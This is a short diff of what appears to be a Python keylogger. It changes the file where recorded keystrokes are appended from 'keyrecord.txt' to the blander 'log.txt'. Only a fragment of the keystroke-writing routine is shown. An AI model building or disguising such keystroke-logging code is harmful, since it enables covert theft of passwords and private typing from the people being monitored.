@@ -21,7 +21,7 @@ if count >= 1:
         keys = []
 
 def write_file(keys):
-    with open("keyrecord.txt","a") as f:
+    with open("log.txt","a") as f:
         for key in keys:
             k=str(key).replace("'","")
             if k.find("backspace") > 0:
